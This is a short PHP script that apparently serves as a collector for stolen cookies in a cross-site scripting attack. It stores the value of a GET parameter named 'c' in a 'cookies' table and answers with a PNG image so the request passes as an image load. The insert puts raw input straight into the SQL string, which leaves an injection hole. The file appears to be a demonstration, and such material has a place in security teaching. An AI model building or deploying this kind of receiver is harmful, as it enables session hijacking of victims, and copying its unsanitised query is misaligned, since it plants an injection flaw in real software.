<?php
/**
 * Created by PhpStorm.
 * User: fer
 * Date: 21/05/15
 * Time: 21:31
 */

$pdo = new PDO(
    'sqlite::memory:',
    null,
    null,
    array(PDO::ATTR_PERSISTENT => true)
);

if ($_GET && isset($_GET['c'])) {
    $pdo->exec("INSERT INTO cookies VALUES ('{$_GET['c']}')");
}

header("Content-type: image/png");
echo file_get_contents('../assets/check.png');
